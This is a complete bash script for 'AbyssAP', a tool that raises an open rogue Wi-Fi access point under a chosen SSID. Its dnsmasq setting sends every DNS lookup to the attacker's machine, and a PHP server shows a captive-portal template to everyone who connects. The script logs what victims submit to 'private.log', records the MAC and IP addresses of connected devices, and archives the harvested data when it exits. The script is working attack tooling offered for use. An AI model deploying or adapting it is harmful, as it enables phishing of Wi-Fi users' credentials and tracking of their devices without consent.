#!/bin/bash

# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Cristian Alexander (Crisstianpd)


#export path
export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin

#colors
greenColor="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
purpleColor="\e[0;35m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
grayColor="\e[0;37m\033[1m"
boldText="\033[0m\e[1m"
normalText="\033[0m"

ssid=""
interface=""
scriptRoute=$(dirname "$0")
template=""

spinner() {
    local pid=$!
    local spin='/-|\'
    local i=0
    while kill -0 $pid 2>/dev/null; do
        printf "\r${spin:i++%4:1}"
        sleep 0.15
    done
    printf "\r "
}

banner(){
	if [[ $1 == 0 ]]; then
		echo;echo
		echo -e "${redColor}   ▄▄▄       ▄▄▄▄ ▓██   ██▓  ██████   ██████  ▄▄▄       ██▓███   ";sleep 0.02
		echo "   ▒████▄    ▓█████▄▒██  ██▒▒██    ▒ ▒██    ▒ ▒████▄    ▓██░  ██▒";sleep 0.02
		echo "   ▒██  ▀█▄  ▒██▒ ▄██▒██ ██░░ ▓██▄   ░ ▓██▄   ▒██  ▀█▄  ▓██░ ██▓▒";sleep 0.02
		echo "   ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░  ▒   ██▒  ▒   ██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒";sleep 0.02
		echo "    ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░▒██████▒▒▒██████▒▒ ▓█   ▓██▒▒██▒ ░  ░";sleep 0.02
		echo "    ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░▒▓▒░ ░  ░";sleep 0.02
		echo "     ▒   ▒▒ ░▒░▒   ░▓██ ░▒░ ░ ░▒  ░ ░░ ░▒  ░ ░  ▒   ▒▒ ░░▒ ░     ";sleep 0.02
		echo "     ░   ▒    ░    ░▒ ▒ ░░  ░  ░  ░  ░  ░  ░    ░   ▒   ░░       ";sleep 0.02
		echo "         ░  ░ ░     ░ ░           ░        ░        ░  ░         ";sleep 0.02
		echo -e "                   ░░ ░            Crisstianpd                               ${endColor}";sleep 0.02
	elif [[ $1 == 1 ]]; then
		echo;echo
		echo -e "${purpleColor}   ▄▄▄       ▄▄▄▄ ▓██   ██▓  ██████   ██████  ▄▄▄       ██▓███   "
		echo "   ▒████▄    ▓█████▄▒██  ██▒▒██    ▒ ▒██    ▒ ▒████▄    ▓██░  ██▒"
		echo "   ▒██  ▀█▄  ▒██▒ ▄██▒██ ██░░ ▓██▄   ░ ▓██▄   ▒██  ▀█▄  ▓██░ ██▓▒"
		echo "   ░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░  ▒   ██▒  ▒   ██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒"
		echo "    ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░▒██████▒▒▒██████▒▒ ▓█   ▓██▒▒██▒ ░  ░"
		echo "    ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░▒▓▒░ ░  ░"
		echo "     ▒   ▒▒ ░▒░▒   ░▓██ ░▒░ ░ ░▒  ░ ░░ ░▒  ░ ░  ▒   ▒▒ ░░▒ ░     "
		echo "     ░   ▒    ░    ░▒ ▒ ░░  ░  ░  ░  ░  ░  ░    ░   ▒   ░░       "
		echo "         ░  ░ ░     ░ ░           ░        ░        ░  ░         "
		echo -e "                   ░░ ░                                           ${endColor}"
		echo -e "${purpleColor}╚══════════════════════════AP Configuration══════════════════════════╗${endColor}"
	elif [[ $1 == 2 ]]; then
		echo -e "${purpleColor}╔═══════════════════════════════AbyssAP════════════════════════════════╗${endColor}"
	elif [[ $1 == 3 ]]; then
		echo -e "${purpleColor}╚══════════════════════════════════════════════════════════════════════╝${endColor}"
	fi
}

main(){
	clear;banner 0
	echo -e "\nStarting..."
	(sleep 0.5) & 
	spinner
	startAP
}

dependencies(){
	echo -e "\n${boldText}Cheking dependencies ...\n";sleep 0.2

	depen=(hostapd php dnsmasq iw jq)
	no_install_depen=()

	for tool in ${depen[@]}; do		
		state=$(command -v $tool)
		if [[ -z $state ]]
		then
			no_install_depen+=($tool)
		fi
	done
	if [[ ${#no_install_depen[@]} != 0 ]]
	then
		echo -n -e "${redColor}[Error]${boldText} The following dependencies were not found: ${yellowColor}"
		for tool in ${no_install_depen[@]}; do
			echo -n -e "${tool} "
		done
		echo -e $endColor
		exit 1
	else
		echo -e "${greenColor}All dependencies installed${endColor}";sleep 0.1
		main
	fi
}

startAP(){
	service network-manager start 2>/dev/null
	systemctl start NetworkManager 2>/dev/null
	service NetworkManager.service start  2>/dev/null
	clear;banner 1
	CONFIGS="/tmp/AbyssAP"
	mkdir -p $CONFIGS



	wifi_devices=()
	echo -e "\n${yellowColor}[AP]${boldText} Select one detected Wireless interface: ${endColor}\n";
	while IFS= read -r device; do
	    wifi_devices+=("$device")
	done < <(ip link show | awk -F: '$0 !~ "lo|vir|br" {print $2}' | awk '{print $1}')
	i=0
	for device in "${wifi_devices[@]}"; do
		i=$((i+1))
	    echo -e "${turquoiseColor}   $i) - $device";
	done
	echo -e -n "\n$yellowColor Select: $endColor";read -p "" index
	if [[ "$index" =~ ^-?[0-9]+$ ]] && (( $index <= $i  )) && (( $index > 0 )); then
		index=$((index-1));interface=${wifi_devices[index]}
		clear;banner 1;echo -e "\n${greenColor}[AP]${boldText} Interface:${endColor} $interface"
	else
		echo -e "${redColor}[ERROR]-[AP]${endColor} Wireless interface no selected (Ej: 2)."
		exit 1
	fi
	echo -e -n "${yellowColor}[AP]${boldText} SSID (AP name): ${endColor}";read -p "" ssid
	if [[ -z $ssid ]]; then
		echo -e "${redColor}[ERROR]-[AP]${endColor} ssid missing."
		exit 1
	elif [[ $ssid == *" "* ]]; then
		echo -e "${redColor}[ERROR]-[AP]${endColor} Spaces in ssid."
		exit 1
	else
		clear;banner 1;echo -e "\n${greenColor}[AP]${boldText} Interface:${endColor} $interface";echo -e "${greenColor}[AP]${boldText} SSID (AP name):${endColor} $ssid"
	fi
	echo -e -n "${yellowColor}[AP]${boldText} Channel (1-12): ${endColor}";read -p "" channel
	if [[ "$channel" =~ ^-?[0-9]+$ ]] && (( $channel <= 12 )) && (( $channel > 0 )); then
		clear;banner 1;echo -e "\n${greenColor}[AP]${boldText} Interface:${endColor} $interface"
		echo -e "${greenColor}[AP]${boldText} SSID (AP name):${endColor} $ssid"
		echo -e "${greenColor}[AP]${boldText} Channel:${endColor} $channel"
	else
		echo -e "${redColor}[ERROR]${yellowColor}[AP]${endColor} Invalid Channel."
    	exit 1
	fi

	echo -e "\n${yellowColor}[^] Configuring hostapd.${endColor}"
	echo -e "interface=${interface}\ndriver=nl80211\nssid=${ssid}\nhw_mode=g\nchannel=${channel}\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n" > $CONFIGS/hostapd.conf
	echo -e "\n${yellowColor}[^] Configuring dnsmasq.${endColor}"
	echo -e "interface=${interface}\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/192.168.1.1\n" > $CONFIGS/dnsmasq.conf




	echo -e "\n${yellowColor}[*] Configuring captive portal.${endColor}"
	echo -e "\n${yellowColor}[CP]${boldText} Select a template:${endColor}"
	i=0
	templatesCount=$(ls $scriptRoute/templates/ | wc -l)
	while [ $i -lt $templatesCount ]; do
		((i++))
		name=$(/usr/bin/ls $scriptRoute/templates/ | awk "NR==$i")
		echo -e "${turquoiseColor}  $i) - $name"
	done
	echo -e -n "\n${yellowColor} Name: ${endColor}";read -p "" template
	name=$(/usr/bin/ls $scriptRoute/templates/ | grep $template)
	if [[ -z $name ]]; then
		echo -e "${redColor}[ERROR]${yellowColor}[CP]${boldText} Template name not found."
    	exit 1
	else
		freePort=$(ss -tuln | grep :80)
		if [[ $freePort == *"80"* ]]; then
			echo -e "${redColor}[ERROR]${yellowColor}[PHP]${boldText} Port 80 in use for another service."
			exit 1
		fi
	fi



	echo -e "\n${redColor}[!] Killing Proccesses.${endColor}"
	systemctl stop NetworkManager 2>/dev/null
	killall network-manager hostapd dhclient dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
	ip link set $interface down;iw dev $interface set type mp;ip link set $interface up



	echo -e "\n${yellowColor}[^] Starting services.${endColor}"
	hostapd $CONFIGS/hostapd.conf > /dev/null 2>&1 &
	dnsmasq -C $CONFIGS/dnsmasq.conf > /dev/null 2>&1 &
	ip addr add 192.168.1.1/24 dev $interface
	ip link set $interface up
	ip route add 192.168.1.0/24 via 192.168.1.1
	ip a show $interface
	php -S 192.168.1.1:80 -t $scriptRoute/templates/$template > /dev/null 2>&1 &



	afterDevices=0
	afterWC=$(wc -l $scriptRoute/templates/$template/private.log | awk '{print $1}')
	touch $scriptRoute/templates/$template/private.log		
	touch $scriptRoute/templates/$template/devices.json	
	while true; do
		beforeDevices=$(iw dev $interface station dump | grep Station | wc -l)
		beforeWC=$(wc -l $scriptRoute/templates/$template/private.log | awk '{print $1}')
		ip neighbor | awk '{print "{ \""$1"\":\""$5"\"}"}' | jq -s 'add' > $scriptRoute/templates/$template/devices.json
		if [[ $beforeDevices != $afterDevices ]] || [[ $beforeWC != $afterWC ]]; then
			clear;banner 2;echo -e "${turquoiseColor}  Connected:${boldText} $beforeDevices";banner 3
			jq . $scriptRoute/templates/$template/private.log
			afterDevices=$beforeDevices
			afterWC=$beforeWC
		fi
	done
}


ctrl_c() {
    echo -e "\n\n${redColor}[\/] Closing program.${endColor}";sleep 0.2
    echo -e "${yellowColor}[-] Stopping and restoring services...${endColor}"
    pkill -f 'php -S'
    pkill -f "hostapd $CONFIGS/"
    pkill -f "dnsmasq -C $CONFIGS/"


	echo -e "${yellowColor}[-] Cleaning...${endColor}"
	fileWC=$(wc -l $scriptRoute/templates/$template/private.log 2>/dev/null)
	if [[ $fileWC > 1 ]]; then
		if [ ! -d "$scriptRoute/data/" ]; then
			mkdir $scriptRoute/data
		fi

		fileName=$(date "+%A_%d-%m-%Y_H:%H:%M:%S")
		jq . $scriptRoute/templates/$template/private.log > $scriptRoute/data/$fileName
		echo -e "\nDevices:" >> $scriptRoute/data/$fileName
		cat $scriptRoute/templates/$template/devices.json >> $scriptRoute/data/$fileName

		echo -e "${boldText}The information was saved in the data folder as \"$fileName\"."
	fi

	rm -rf $scriptRoute/templates/$template/private.log
	rm -rf $scriptRoute/templates/$template/devices.json

    echo -e "${yellowColor}[-] Exiting...${endColor}"
	systemctl start NetworkManager 2>/dev/null
	service network-manager start 2>/dev/null
	service wpa_supplicant start 2>/dev/null
	service isc-dhcp-server start 2>/dev/null
	rm -rf $CONFIGS
	exit 0
}

trap ctrl_c INT






#START PROGRAM
if [[ "$(id -u)" != 0 ]]; then
	echo -e "\n${redColor}[!] Execute as root.${endColor}"
else
	dependencies
fi




